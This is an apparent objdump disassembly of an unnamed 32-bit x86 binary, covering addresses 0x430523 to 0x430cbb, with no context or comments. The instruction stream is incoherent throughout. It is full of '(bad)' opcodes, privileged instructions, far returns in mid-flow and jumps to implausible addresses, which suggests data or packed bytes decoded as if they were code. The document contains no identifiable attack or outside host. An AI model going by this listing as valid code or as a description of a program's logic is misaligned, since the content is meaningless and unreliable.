  430523:	ret    
  430524:	test   bh,al
  430526:	pop    es
  430527:	xchg   ebp,eax
  430528:	add    bh,bh
  43052a:	inc    ebp
  43052b:	dec    DWORD PTR [edi]
  43052d:	sub    ebp,DWORD PTR [ebx]
  43052f:	add    BYTE PTR [eax],al
  430531:	push   eax
  430532:	jbe    0x430589
  430534:	mov    cl,BYTE PTR [ebx-0x34e00b80]
  43053a:	or     al,0xcf
  43053c:	inc    eax
  43053d:	enter  0x745,0x72
  430541:	inc    ebp
  430542:	mov    eax,DWORD PTR [ecx]
  430544:	int3   
  430545:	add    BYTE PTR [ebp-0x75],al
  430548:	xor    DWORD PTR [eax+0x33c74d9c],edi
  43054e:	ror    BYTE PTR [ebp+0x72f80885],1
  430554:	inc    ebp
  430555:	add    BYTE PTR [ebx-0x3c7423bb],cl
  43055b:	fadd   st,st(6)
  43055d:	rol    BYTE PTR [ebp+0x12],0x8b
  430561:	inc    ebp
  430562:	fmul   QWORD PTR [ebx-0x3c39233d]
  430568:	inc    ebp
  430569:	test   bh,al
  43056b:	fwait
  43056c:	clc    
  43056d:	xor    al,BYTE PTR [ebp+0x45dcf889]
  430573:	inc    ebp
  430574:	xor    esi,DWORD PTR [ebx]
  430576:	pushf  
  430577:	mov    ecx,0xffb48dc7
  43057c:	test   eax,ecx
  43057e:	clc    
  43057f:	dec    ebp
  430580:	inc    ebp
  430581:	mov    edi,DWORD PTR ds:0xc7c19c08
  430587:	xchg   BYTE PTR [esi+edi*8-0x807007b],ah
  43058e:	inc    ebp
  43058f:	inc    ebp
  430590:	aas    
  430591:	mov    ebx,DWORD PTR [eax+ecx*1+0x18e8c8c7]
  430598:	test   DWORD PTR [ecx],esi
  43059a:	clc    
  43059b:	pushf  
  43059c:	inc    ebp
  43059d:	dec    DWORD PTR [ebx-0x3cba0f04]
  4305a3:	push   eax
  4305a4:	mov    BYTE PTR [edx],0x7d
  4305a7:	add    BYTE PTR [ebx],bh
  4305a9:	mov    ecx,DWORD PTR [edi]
  4305ab:	mov    DWORD PTR [eax],ebx
  4305ad:	les    eax,FWORD PTR [eax]
  4305af:	adc    ebp,ecx
  4305b1:	dec    ebp
  4305b2:	add    DWORD PTR [ebx-0x34ba3c00],ecx
  4305b8:	mov    ecx,esi
  4305ba:	lock or al,cl
  4305bd:	clc    
  4305be:	inc    ebp
  4305bf:	add    esi,DWORD PTR [ebx]
  4305c1:	jge    0x4305c6
  4305c3:	xor    edi,DWORD PTR [ebx]
  4305c5:	cmp    ecx,DWORD PTR [edi]
  4305c7:	paddb  mm1,QWORD PTR [eax+eax*1+0x0]
  4305cc:	mov    edi,DWORD PTR [ecx]
  4305ce:	test   al,0xcc
  4305d0:	dec    ebp
  4305d1:	test   BYTE PTR [ebx],dh
  4305d3:	pop    es
  4305d4:	xor    eax,DWORD PTR [eax]
  4305d6:	add    ecx,DWORD PTR [esi]
  4305d8:	add    ecx,eax
  4305da:	psraw  mm0,mm1
  4305dd:	sub    BYTE PTR [ebp+0x38],cl
  4305e0:	mov    edi,DWORD PTR [ebx]
  4305e2:	lock int3 
  4305e4:	shl    edx,1
  4305e6:	rol    BYTE PTR [ebp+0xc],1
  4305e9:	mov    DWORD PTR [ebp-0x24],0xf8038533
  4305f0:	jmp    0x75063a
  4305f5:	pushf  
  4305f6:	inc    ebp
  4305f7:	mov    DWORD PTR [ebx-0x3cba0710],ecx
  4305fd:	xor    ecx,ebx
  4305ff:	add    ecx,esi
  430601:	mov    esi,eax
  430603:	enter  0x45af,0x8b
  430607:	xor    ecx,eax
  430609:	add    edx,DWORD PTR [ebp-0x77]
  43060c:	sub    ecx,DWORD PTR [eax]
  43060e:	cmp    eax,DWORD PTR [ebp+0x77]
  430611:	ror    DWORD PTR [ebx-0x76385764],1
  430617:	test   al,0x0
  430619:	test   DWORD PTR [ebx+0x4d45acf8],ecx
  43061f:	cmp    al,0x33
  430621:	pushf  
  430622:	xor    eax,edi
  430624:	add    ebp,DWORD PTR [ebx+eax*1-0x3e07f07b]
  43062b:	inc    ebp
  43062c:	dec    ebp
  43062d:	mov    ebx,DWORD PTR ds:[eax+esi*8-0x2f432e39]
  430635:	test   DWORD PTR ds:0xeb4545f8,eax
  43063b:	cmp    BYTE PTR [ebx+0x4d8ba49c],cl
  430641:	fdiv   QWORD PTR [ebx]
  430643:	dec    ebp
  430644:	xor    esi,DWORD PTR [ebx]
  430646:	add    eax,DWORD PTR [ebx]
  430648:	add    ecx,DWORD PTR [ecx-0x373e4ff1]
  43064e:	dec    ebp
  43064f:	test   BYTE PTR [ebx-0x2eff0ffe],cl
  430655:	out    dx,eax
  430656:	rol    BYTE PTR [eax],1
  430658:	add    eax,0xebc8458b
  43065d:	dec    ebp
  43065e:	mov    ebp,DWORD PTR [ebx]
  430660:	mov    esp,0x33f84d8b
  430665:	ret    
  430666:	xor    eax,esi
  430668:	add    ecx,eax
  43066a:	add    eax,DWORD PTR [edx+0xc1010f]
  430670:	dec    ebp
  430671:	inc    ebp
  430672:	mov    ecx,DWORD PTR [ebx-0x3c2e0710]
  430678:	ror    bl,1
  43067a:	add    eax,0xebc645ce
  43067f:	scas   eax,DWORD PTR es:[edi]
  430680:	mov    ecx,DWORD PTR [ebx+0x554dc8e8]
  430686:	xor    ebp,DWORD PTR [ebx]
  430688:	xor    edi,DWORD PTR [ebx]
  43068a:	add    esi,DWORD PTR [edi+0x3]
  43068d:	mov    ecx,DWORD PTR [edi]
  43068f:	clc    
  430690:	rol    ebx,0x4d
  430693:	(bad)  
  430694:	mov    edi,DWORD PTR [eax+esi*8-0x2f742f00]
  43069b:	mov    ah,0x45
  43069d:	dec    ebp
  43069e:	jbe    0x4306d3
  4306a0:	mov    esi,DWORD PTR [ebx]
  4306a2:	call   0x334653aa
  4306a7:	rdpmc  
  4306a9:	rol    DWORD PTR [ebx],0x4d
  4306ac:	add    ecx,DWORD PTR [ebx-0x2e3e0ff1]
  4306b2:	inc    ebp
  4306b3:	ror    BYTE PTR [ebx+0x45450808],1
  4306b9:	jmp    0x10b0749
  4306be:	inc    ebp
  4306bf:	inc    ebp
  4306c0:	(bad)  
  4306c1:	mov    ebx,eax
  4306c3:	clc    
  4306c4:	test   ebx,eax
  4306c6:	clc    
  4306c7:	retf   
  4306c8:	inc    ebp
  4306c9:	into   
  4306ca:	mov    esi,0x8b85afec
  4306d0:	clc    
  4306d1:	enter  0x5545,0x33
  4306d5:	sub    ebx,DWORD PTR [ebx+edi*1-0x74278875]
  4306dc:	ret    
  4306dd:	mov    ah,0xc6
  4306df:	addr16 push 0x338b4545
  4306e5:	clc    
  4306e6:	add    eax,ebx
  4306e8:	loopne 0x4306b5
  4306ea:	dec    ebp
  4306eb:	into   
  4306ec:	mov    al,dh
  4306ee:	or     BYTE PTR [edi-0x37ff748e],ch
  4306f4:	inc    ebp
  4306f5:	push   ebp
  4306f6:	mov    ebp,DWORD PTR [ebx]
  4306f8:	in     al,dx
  4306f9:	cmp    eax,ebx
  4306fb:	ja     0x430742
  4306fd:	mov    ecx,DWORD PTR [ebx-0x7bba2354]
  430703:	inc    ebp
  430704:	fwait
  430705:	mov    esi,DWORD PTR [edx]
  430707:	clc    
  430708:	mov    bl,al
  43070a:	xlat   BYTE PTR ds:[ebx]
  43070b:	retf   
  43070c:	inc    ebp
  43070d:	into   
  43070e:	mov    eax,esi
  430710:	in     al,dx
  430711:	scas   eax,DWORD PTR es:[edi]
  430712:	retf   
  430713:	mov    ecx,DWORD PTR [ebp-0x38]
  430716:	mov    edx,DWORD PTR [ebp-0x24]
  430719:	sub    eax,DWORD PTR [ebx+edi*1-0x74cd8865]
  430720:	mov    ah,BYTE PTR [edi+edx*8+0x33454d23]
  430727:	mov    eax,DWORD PTR [ebx]
  430729:	clc    
  43072a:	loopne 0x4306ef
  43072c:	push   ebp
  43072d:	retf   
  43072e:	mov    dh,al
  430730:	adc    esi,ecx
  430732:	jb     0x4306e3
  430734:	add    BYTE PTR [ebx+0x558bc845],cl
  43073a:	in     al,dx
  43073b:	sub    eax,ebx
  43073d:	cmp    ecx,ebx
  43073f:	mov    eax,esi
  430741:	mov    esp,0x45af03ce
  430746:	add    ecx,DWORD PTR [ebx-0x34ba0720]
  43074c:	mov    eax,ebx
  43074e:	in     al,dx
  43074f:	into   
  430750:	dec    ebp
  430751:	(bad)  
  430752:	xor    ebp,DWORD PTR [edi+0x80f8903]
  430758:	rol    DWORD PTR [ebp+0x4d],0x89
  43075c:	xor    esp,esp
  43075e:	sub    eax,DWORD PTR [ebp-0x75]
  430761:	add    ebp,esp
  430763:	mov    al,0x55
  430765:	inc    ebp
  430766:	xor    esi,DWORD PTR [ecx]
  430768:	add    ebx,DWORD PTR [edi+ecx*1+0x55dcca89]
  43076f:	inc    ebp
  430770:	xor    esi,DWORD PTR [edx]
  430772:	sub    ebx,DWORD PTR [ebp+ecx*4+0x72c011c7]
  430779:	test   DWORD PTR [eax],eax
  43077b:	clc    
  43077c:	enter  0x8645,0x33
  430780:	inc    DWORD PTR [ebx]
  430782:	(bad)  
  430783:	jmp    0x4307ca
  430785:	mov    ecx,DWORD PTR [ebx-0x3c3c1b28]
  43078b:	inc    ebp
  43078c:	(bad)  
  43078d:	mov    ebp,DWORD PTR [edi-0x277b7424]
  430793:	fwait
  430794:	retf   
  430795:	xor    al,cl
  430797:	mov    BYTE PTR [ebp+0xb],cl
  43079a:	lea    eax,[ebp+0x8]
  43079d:	xor    esi,DWORD PTR [edx+0x3]
  4307a0:	add    al,ah
  4307a2:	inc    ebp
  4307a3:	dec    ebp
  4307a4:	mov    ecx,DWORD PTR [edx+0x72c308d0]
  4307aa:	gs add ch,cl
  4307ad:	inc    ebp
  4307ae:	sub    ecx,DWORD PTR [edx+0x4df00b03]
  4307b4:	inc    ebp
  4307b5:	xor    ecx,DWORD PTR [ebx-0x3c1f37fd]
  4307bb:	push   ebp
  4307bc:	(bad)  
  4307bd:	mov    BYTE PTR [edi+0xf723b11],ch
  4307c3:	add    ch,ch
  4307c5:	inc    ebp
  4307c6:	dec    DWORD PTR [ebx-0x34332775]
  4307cc:	add    al,0x4d
  4307ce:	inc    ebp
  4307cf:	mov    ecx,DWORD PTR [ebx-0x7f7b0324]
  4307d5:	fwait
  4307d6:	add    DWORD PTR [edx],esi
  4307d8:	add    BYTE PTR [ebx+0x4d00c000],cl
  4307de:	push   DWORD PTR [ebx]
  4307e0:	int3   
  4307e1:	xor    eax,DWORD PTR [eax]
  4307e3:	add    edx,DWORD PTR [eax+0x3]
  4307e6:	mov    DWORD PTR [edi],ecx
  4307e8:	call   0x4288c8ae
  4307ed:	mov    DWORD PTR [ebp-0x20],esp
  4307f0:	add    BYTE PTR [ebp+0x7d],al
  4307f3:	mov    eax,DWORD PTR [eax]
  4307f5:	in     al,0x15
  4307f7:	ret    
  4307f8:	iret   
  4307f9:	(bad)  
  4307fa:	enter  0x14af,0x8b
  4307fe:	(bad)  
  4307ff:	in     al,dx
  430800:	or     bl,cl
  430802:	adc    cl,al
  430804:	push   ebp
  430805:	dec    ebp
  430806:	inc    eax
  430807:	mov    edx,DWORD PTR [ebp-0x20]
  43080a:	jb     0x4307d7
  43080c:	mov    ecx,esi
  43080e:	cld    
  43080f:	scas   eax,DWORD PTR es:[edi]
  430810:	or     BYTE PTR [ebx-0x2cff27ff],0x0
  430817:	mov    BYTE PTR [eax],0x8c
  43081a:	push   0xffffff9b
  43081c:	push   edi
  43081d:	xor    dl,BYTE PTR [eax+0x3b]
  430820:	mov    ecx,DWORD PTR [edi]
  430822:	call   0x8c424d85
  430827:	mov    eax,eax
  430829:	in     al,dx
  43082a:	jge    0x430879
  43082c:	mov    DWORD PTR [ebx],esi
  43082e:	int3   
  43082f:	add    eax,DWORD PTR [ebp+0xf]
  430832:	xor    eax,ecx
  430834:	(bad)  
  430835:	dec    ebp
  430836:	pushf  
  430837:	xor    ecx,esi
  430839:	add    edi,DWORD PTR [edi]
  43083b:	mov    eax,DWORD PTR [ebp-0x38]
  43083e:	(bad)  
  43083f:	test   dh,dl
  430841:	fwait
  430842:	add    esi,DWORD PTR [edx]
  430844:	jmp    0x4307cf
  430846:	mov    cl,al
  430848:	add    eax,0x14330f45
  43084d:	mov    ecx,0xff468d80
  430852:	jmp    0xc990181f
  430857:	mov    edx,ecx
  430859:	rol    BYTE PTR [ebp+0x330155],1
  43085f:	add    ecx,DWORD PTR [ebp+0xf]
  430862:	xor    eax,edx
  430864:	(bad)  
  430865:	ror    DWORD PTR [eax],0x86
  430868:	jb     0x430867
  43086a:	add    bh,bh
  43086c:	clc    
  43086d:	inc    ebp
  43086e:	jb     0x4308da
  430870:	mov    ecx,DWORD PTR [ecx+0x4545c008]
  430876:	xor    DWORD PTR [ebx+0xc7d89c],ecx
  43087c:	shr    BYTE PTR [eax-0x3d],0x30
  430880:	clc    
  430881:	add    BYTE PTR [ebp+0x75],al
  430884:	xor    DWORD PTR [edx-0x64],ebp
  430887:	inc    edi
  430889:	adc    al,0xe8
  43088b:	inc    ebp
  43088c:	test   DWORD PTR [ebp-0x7cba8b08],eax
  430892:	mov    ecx,DWORD PTR [eax]
  430894:	cld    
  430895:	or     DWORD PTR [ebp-0x34],0x33
  430899:	jbe    0x43089e
  43089b:	mov    edx,DWORD PTR [ecx+0x2b]
  43089e:	dec    ebp
  43089f:	mov    cl,BYTE PTR [ebx+0x45d801]
  4308a5:	mov    BYTE PTR [ebx],dh
  4308a7:	mov    eax,DWORD PTR [ebx]
  4308a9:	or     BYTE PTR [ecx+0x3b],dl
  4308ac:	dec    ebp
  4308ad:	int3   
  4308ae:	xor    ebp,edi
  4308b0:	add    eax,DWORD PTR [ebp+0x51]
  4308b3:	mov    ecx,DWORD PTR [ebp-0x28]
  4308b6:	xor    eax,DWORD PTR [eax]
  4308b8:	add    ebp,DWORD PTR [eax+0x51]
  4308bb:	adc    BYTE PTR [eax+0x0],0x8b
  4308bf:	add    BYTE PTR [ebx+0x4d18fcff],cl
  4308c5:	inc    ebp
  4308c6:	mov    ecx,DWORD PTR [ecx+0x4500c4d8]
  4308cc:	xor    ecx,DWORD PTR [ebx+0x4551c403]
  4308d2:	dec    ebp
  4308d3:	mov    esi,DWORD PTR [ebx]
  4308d5:	hlt    
  4308d6:	add    eax,ebx
  4308d8:	push   ecx
  4308d9:	inc    ebp
  4308da:	dec    ebp
  4308db:	(bad)  
  4308dc:	call   esi
  4308de:	in     al,0xc7
  4308e0:	retf   
  4308e1:	mov    al,ds:0xc5ff3dce
  4308e6:	adc    al,0xc6
  4308e8:	inc    ebp
  4308e9:	and    eax,0x9c0f4c85
  4308ee:	cmp    DWORD PTR [esi-0xe7ac800],0xf
  4308f5:	cmp    BYTE PTR [ebx+0x38],0x0
  4308f9:	mov    dh,0xc7
  4308fb:	cmp    eax,eax
  4308fd:	jne    0x45440149
  430903:	mov    esi,DWORD PTR [ebx]
  430905:	mov    eax,0x848bcb9c
  43090a:	rcr    BYTE PTR [ebx-0x7c7fcd0f],0x65
  430911:	or     BYTE PTR [edi],cl
  430913:	(bad)  
  430914:	dec    ebp
  430915:	inc    edi
  430916:	add    bh,0x54
  430919:	or     cl,ch
  43091b:	test   DWORD PTR [eax+0x4d4501f8],ecx
  430921:	add    BYTE PTR [eax-0x1638ab64],0xbc
  430928:	mov    BYTE PTR [ebp+0x45a5f802],dh
  43092e:	(bad)  
  43092f:	cmp    eax,0x89839cff
  430934:	je     0x43091a
  430936:	inc    DWORD PTR [ebp+0x0]
  430939:	mov    ecx,DWORD PTR [ebp-0x340018]
  43093f:	into   
  430940:	dec    DWORD PTR [ebx-0x7f72431c]
  430946:	push   0x5000ff01
  43094b:	retf   
  43094c:	inc    ebp
  43094d:	into   
  43094e:	dec    DWORD PTR [ebx-0x343f3ff4]
  430954:	push   eax
  430955:	into   
  430956:	call   0x4b0de6
  43095b:	retf   
  43095c:	add    dh,cl
  43095e:	add    bh,bh
  430960:	mov    DWORD PTR [eax+ecx*1],edx
  430963:	clc    
  430964:	inc    ebp
  430965:	inc    ebp
  430966:	mov    ecx,DWORD PTR [ebx-0x7fff1728]
  43096c:	push   0x1
  43096e:	push   edi
  43096f:	add    BYTE PTR [eax-0x35],dl
  430972:	mov    ecx,esi
  430974:	cld    
  430975:	mov    ecx,DWORD PTR [ecx+0xcb01bc]
  43097b:	into   
  43097c:	ror    BYTE PTR [ebx+0x75000800],0x50
  430983:	xor    eax,DWORD PTR [ebp+0x3]
  430986:	jne    0x4309d9
  430988:	call   DWORD PTR [eax-0x3c]
  43098b:	mov    DWORD PTR [ecx-0x18],edx
  43098e:	mov    edi,edi
  430990:	call   0x8b464f19
  430995:	add    ah,ah
  430997:	rol    BYTE PTR [ebp-0x7c],0xeb
  43099b:	add    edi,edi
  43099d:	add    al,ch
  43099f:	inc    ebp
  4309a0:	push   ecx
  4309a1:	cmp    al,0x8b
  4309a3:	pushf  
  4309a4:	(bad)  
  4309a5:	mov    DWORD PTR [ebp-0x50],0xf8e485c7
  4309ac:	test   DWORD PTR [ebp-0x8],ecx
  4309af:	add    BYTE PTR [ebp+0x54],0x32
  4309b3:	jmp    0x8bcc9254
  4309b8:	in     al,dx
  4309b9:	or     BYTE PTR [ebp-0xf],al
  4309bc:	xor    eax,DWORD PTR [eax+0x4f896503]
  4309c2:	hlt    
  4309c3:	mov    eax,DWORD PTR [ebp-0x50]
  4309c6:	xor    esi,ecx
  4309c8:	add    eax,DWORD PTR [eax+0x4f086589]
  4309ce:	inc    ebp
  4309cf:	adc    ecx,0x68
  4309d2:	pushf  
  4309d3:	inc    edi
  4309d5:	add    al,ch
  4309d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4309d8:	test   edi,edi
  4309da:	clc    
  4309db:	inc    DWORD PTR [ebp-0x73]
  4309de:	cmp    al,0x74
  4309e0:	pushf  
  4309e1:	inc    edi
  4309e3:	push   ecx
  4309e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4309e5:	jne    0x43096c
  4309e7:	push   eax
  4309e8:	clc    
  4309e9:	test   DWORD PTR [ebp-0x1],eax
  4309ec:	call   FWORD PTR ds:[ebx+ecx*4+0x70b4c4c7]
  4309f4:	test   DWORD PTR [ebx+0x574510f8],eax
  4309fa:	cmp    BYTE PTR [edx],bl
  4309fc:	pushf  
  4309fd:	add    BYTE PTR [ebx+0x4d80e468],cl
  430a03:	add    BYTE PTR [ebx],dh
  430a05:	inc    ebp
  430a06:	add    ecx,DWORD PTR [ebx-0x7f3f0377]
  430a0c:	enter  0x8401,0x0
  430a10:	add    al,BYTE PTR [eax]
  430a12:	add    bh,bh
  430a14:	out    dx,eax
  430a15:	sbb    BYTE PTR [eax],al
  430a17:	dec    ebp
  430a18:	mov    ecx,DWORD PTR [ebx+0x4dd8f4]
  430a1e:	sub    esi,DWORD PTR [ebx]
  430a20:	mov    ebp,DWORD PTR [eax-0x8]
  430a23:	add    bl,0x0
  430a26:	(bad)  
  430a27:	cmp    eax,ecx
  430a29:	or     BYTE PTR [edx+0x750114],al
  430a2f:	inc    DWORD PTR [ebp+0x18]
  430a32:	mov    eax,DWORD PTR [ebp-0x8]
  430a35:	mov    ebx,eax
  430a37:	(bad)  
  430a38:	retf   
  430a39:	inc    ebp
  430a3a:	into   
  430a3b:	mov    esi,eax
  430a3d:	int3   
  430a3e:	scas   eax,DWORD PTR es:[edi]
  430a3f:	push   es
  430a40:	mov    esi,DWORD PTR [ebp-0xc]
  430a43:	call   DWORD PTR [ebp+0x18]
  430a46:	sub    edi,DWORD PTR [ebp+0x3b]
  430a49:	mov    esi,DWORD PTR [edi-0x34]
  430a4c:	mov    eax,DWORD PTR [ebp-0x8]
  430a4f:	xor    ebx,eax
  430a51:	pushf  
  430a52:	mov    bh,0xbc
  430a55:	fadd   QWORD PTR [eax]
  430a57:	test   DWORD PTR [ebx+0x4d45bcf8],ecx
  430a5d:	mov    esi,DWORD PTR [ebx]
  430a5f:	in     al,0x33
  430a61:	ret    
  430a62:	add    eax,esi
  430a64:	add    eax,DWORD PTR [ebp+0xf]
  430a67:	mov    eax,ecx
  430a69:	in     al,0x4d
  430a6b:	ret    
  430a6c:	mov    eax,esi
  430a6e:	in     al,dx
  430a6f:	inc    ebp
  430a70:	rol    edi,1
  430a72:	sar    al,1
  430a74:	or     BYTE PTR [ebp+0x45e9f845],al
  430a7a:	add    BYTE PTR [ebx],dh
  430a7c:	add    BYTE PTR [ebp+eax*2-0x7437439],bl
  430a83:	test   ebx,eax
  430a85:	clc    
  430a86:	retf   
  430a87:	inc    ebp
  430a88:	into   
  430a89:	cmp    eax,0xc7af9cc6
  430a8e:	mov    ebp,DWORD PTR [esp+esi*8+0x2bf85585]
  430a95:	inc    ebp
  430a96:	cmp    edi,DWORD PTR [edi]
  430a98:	ja     0x430a36
  430a9a:	mov    eax,edi
  430a9c:	mov    esp,0x458567a8
  430aa1:	clc    
  430aa2:	mov    eax,DWORD PTR [ebp-0x8]
  430aa5:	mov    eax,ebx
  430aa7:	in     al,dx
  430aa8:	retf   
  430aa9:	ret    
  430aaa:	into   
  430aab:	mov    dh,0x7d
  430aae:	scas   eax,DWORD PTR es:[edi]
  430aaf:	cmp    ecx,DWORD PTR [ebx+0x5518f40f]
  430ab5:	add    BYTE PTR [ebx],ch
  430ab7:	jmp    0xba0bf7
  430abc:	mov    eax,DWORD PTR [ebp-0x5c]
  430abf:	mov    eax,DWORD PTR [ebp-0x14]
  430ac2:	inc    ebp
  430ac3:	enter  0x458b,0xf8
  430ac7:	xor    eax,ebx
  430ac9:	add    ecx,ebx
  430acb:	cmp    ecx,esi
  430acd:	shufps xmm7,xmm4,0xaf
  430ad1:	add    BYTE PTR [ebx+0x55e8f48b],cl
  430ad7:	dec    ebp
  430ad8:	sub    esi,DWORD PTR [ebx]
  430ada:	cmp    esi,DWORD PTR [ebx]
  430adc:	ja     0x430ae1
  430ade:	mov    eax,DWORD PTR [ebx]
  430ae0:	lods   al,BYTE PTR ds:[esi]
  430ae1:	mov    db0,ecx
  430ae4:	inc    ebp
  430ae5:	dec    ebp
  430ae6:	mov    ecx,DWORD PTR [ebx-0x2e3c1308]
  430aec:	retf   
  430aed:	rol    dh,1
  430aef:	or     al,0xce
  430af1:	inc    ebp
  430af2:	scas   eax,DWORD PTR es:[edi]
  430af3:	xor    ecx,DWORD PTR [ebx+0x55e9f403]
  430af9:	add    BYTE PTR [ebx],ch
  430afb:	add    BYTE PTR [ebx],bh
  430afd:	inc    ebp
  430afe:	mov    ecx,DWORD PTR [ebx-0x3cfc074c]
  430b04:	inc    ebp
  430b05:	retf   
  430b06:	mov    ecx,esi
  430b08:	clc    
  430b09:	(bad)  
  430b0a:	retf   
  430b0b:	scas   eax,DWORD PTR es:[edi]
  430b0c:	ret    
  430b0d:	mov    ecx,esi
  430b0f:	hlt    
  430b10:	(bad)  
  430b11:	push   ebp
  430b12:	scas   eax,DWORD PTR es:[edi]
  430b13:	sub    ecx,DWORD PTR [ecx+0x4577083b]
  430b19:	mov    ecx,DWORD PTR [ecx+0x4589e4e8]
  430b1f:	add    BYTE PTR [ebx],al
  430b21:	mov    eax,eax
  430b23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430b24:	inc    ebp
  430b25:	dec    ebp
  430b26:	xor    DWORD PTR [ebx],esi
  430b28:	pushf  
  430b29:	xor    ecx,DWORD PTR [ecx+0x4503d003]
  430b2f:	rdmsr  
  430b31:	rcr    DWORD PTR [ebp+ecx*2-0x134f7439],0x85
  430b39:	sar    eax,1
  430b3b:	rol    BYTE PTR [ebp+0x5],1
  430b3e:	xor    eax,DWORD PTR [ebp+0x3]
  430b41:	jmp    0x430b2e
  430b43:	mov    ecx,DWORD PTR [ebx-0x3cb22754]
  430b49:	xor    eax,DWORD PTR [ebp+0x33]
  430b4c:	mov    eax,DWORD PTR [ebx]
  430b4e:	rol    BYTE PTR [ebx],1
  430b50:	test   BYTE PTR [edi],cl
  430b52:	fwait
  430b53:	shl    DWORD PTR [edx],0x4d
  430b56:	mov    BYTE PTR [ebx-0x2eba13f5],cl
  430b5c:	xor    edx,eax
  430b5e:	add    eax,DWORD PTR ds:0xeb4d45e0
  430b64:	mov    cl,BYTE PTR [ebx+0x4d72b408]
  430b6a:	add    BYTE PTR [ebx],dh
  430b6c:	inc    ebp
  430b6d:	xor    ecx,DWORD PTR [edx+0x4d030b03]
  430b73:	rdpmc  
  430b75:	rol    DWORD PTR [ebx],0x4d
  430b78:	loopne 0x430b05
  430b7a:	push   ebp
  430b7b:	in     al,dx
  430b7c:	mov    cl,dl
  430b7e:	adc    eax,edx
  430b80:	jb     0x430b87
  430b82:	add    BYTE PTR [ebp+0x45],al
  430b85:	jmp    0x430b12
  430b87:	mov    ebx,eax
  430b89:	test   al,0xcb
  430b8b:	dec    ebp
  430b8c:	dec    ebp
  430b8d:	xor    ecx,DWORD PTR [ebx-0x7bfc2fcd]
  430b93:	add    ebx,DWORD PTR [ebx-0x743ecdf1]
  430b99:	dec    ebp
  430b9a:	mov    al,0x8b
  430b9c:	dec    ebp
  430b9d:	in     al,dx
  430b9e:	xor    edx,ecx
  430ba0:	xor    edx,eax
  430ba2:	add    eax,DWORD PTR [ebp+0x3]
  430ba5:	jbe    0x430bb6
  430ba7:	mov    eax,ecx
  430ba9:	test   al,0x45
  430bab:	dec    ebp
  430bac:	mov    DWORD PTR [ebx],esi
  430bae:	loopne 0x430be3
  430bb0:	inc    ebp
  430bb1:	add    ecx,DWORD PTR [ebx-0x3cf01bfd]
  430bb7:	rol    esi,0x45
  430bba:	scas   eax,DWORD PTR es:[edi]
  430bbb:	mov    ecx,DWORD PTR [ebx-0x34ba0ff8]
  430bc1:	mov    eax,ecx
  430bc3:	hlt    
  430bc4:	dec    ebp
  430bc5:	inc    ebp
  430bc6:	mov    eax,edi
  430bc8:	loopne 0x430ba2
  430bca:	retf   
  430bcb:	test   esi,ecx
  430bcd:	clc    
  430bce:	scas   eax,DWORD PTR es:[edi]
  430bcf:	inc    ebp
  430bd0:	mov    eax,edi
  430bd2:	fdiv   st,st(0)
  430bd4:	rol    DWORD PTR [ebp+0x458cf8c6],cl
  430bda:	fwait
  430bdb:	xor    esi,DWORD PTR [edx]
  430bdd:	pushf  
  430bde:	cmp    ecx,DWORD PTR [ebx-0x3ca127f1]
  430be4:	inc    esi
  430be6:	mov    ebp,DWORD PTR [eax-0x10]
  430be9:	inc    ebp
  430bea:	dec    ebp
  430beb:	xor    esi,DWORD PTR [ebx]
  430bed:	add    eax,DWORD PTR [ebx]
  430bef:	loopne 0x430c00
  430bf1:	dec    ebp
  430bf2:	ror    DWORD PTR [edx+0x7233084d],0x3
  430bf9:	add    BYTE PTR [ebx-0x7b740bbb],cl
  430bff:	lock fwait
  430c01:	ret    
  430c02:	xor    al,BYTE PTR [ebp-0x77]
  430c05:	mov    esi,esp
  430c07:	rol    BYTE PTR [ebp-0x7c],1
  430c0a:	xor    ebx,DWORD PTR [ebx-0x7772cd47]
  430c10:	call   edi
  430c12:	enter  0x4d45,0x8b
  430c16:	mov    esi,eax
  430c18:	fmul   st(3),st
  430c1a:	push   ebp
  430c1b:	dec    ebp
  430c1c:	xor    ecx,DWORD PTR [ebx-0x7bf02ffd]
  430c22:	ret    0xc19b
  430c25:	xor    al,BYTE PTR [esi-0x280276]
  430c2b:	dec    ebp
  430c2c:	jne    0x430c61
  430c2e:	mov    eax,DWORD PTR [ebx]
  430c30:	cld    
  430c31:	loopne 0x430be3
  430c33:	push   ebp
  430c34:	add    DWORD PTR [eax+0x72851100],ecx
  430c3a:	inc    DWORD PTR [eax]
  430c3c:	inc    DWORD PTR [ebp-0x75]
  430c3f:	mov    edi,esp
  430c41:	lock add bl,0x1
  430c45:	retf   
  430c46:	add    dh,al
  430c48:	xor    dh,cl
  430c4a:	inc    ebp
  430c4b:	scas   eax,DWORD PTR es:[edi]
  430c4c:	mov    eax,DWORD PTR [ebx]
  430c4e:	shl    al,0x0
  430c51:	inc    ebp
  430c52:	dec    DWORD PTR [ebx+0x4dccf0ff]
  430c58:	call   0x461f90
  430c5d:	ud0    eax,ecx
  430c60:	adc    al,0x4d
  430c62:	inc    ebp
  430c63:	xor    ecx,DWORD PTR [ebx+0x8bd82b]
  430c69:	lock push 0x338055
  430c6f:	add    eax,DWORD PTR [eax]
  430c71:	ud0    ecx,edx
  430c74:	sbb    BYTE PTR [ebp+0x5e],dl
  430c77:	xor    ecx,ecx
  430c79:	sub    eax,DWORD PTR [ecx*4+0x72ec1155]
  430c80:	push   ecx
  430c81:	add    BYTE PTR [ebp-0x38],cl
  430c84:	mov    DWORD PTR [esi-0x740004],eax
  430c8a:	cld    
  430c8b:	inc    ebp
  430c8c:	jmp    0x430c19
  430c8e:	mov    esp,esp
  430c90:	mov    ebx,eax
  430c92:	mov    eax,esi
  430c94:	clc    
  430c95:	scas   eax,DWORD PTR es:[edi]
  430c96:	icebp  
  430c97:	mov    esi,DWORD PTR [ebp-0x28]
  430c9a:	(bad)  
  430c9b:	retf   
  430c9c:	or     ecx,eax
  430c9e:	(bad)  
  430c9f:	dec    ebp
  430ca0:	pop    es
  430ca1:	(bad)  
  430ca2:	(bad)  
  430ca3:	or     BYTE PTR [esi],al
  430ca5:	jb     0x430c6d
  430ca7:	add    BYTE PTR [ebx],al
  430ca9:	inc    ebp
  430caa:	(bad)  
  430cab:	mov    ecx,DWORD PTR [edx]
  430cad:	fadd   st(6),st
  430caf:	ret    
  430cb0:	add    ah,BYTE PTR [ebp-0x37]
  430cb3:	int    0x55
  430cb5:	sub    ebp,esp
  430cb7:	add    edx,DWORD PTR [ecx-0x14]
  430cba:	inc    ebp
  430cbb:	inc    ebp
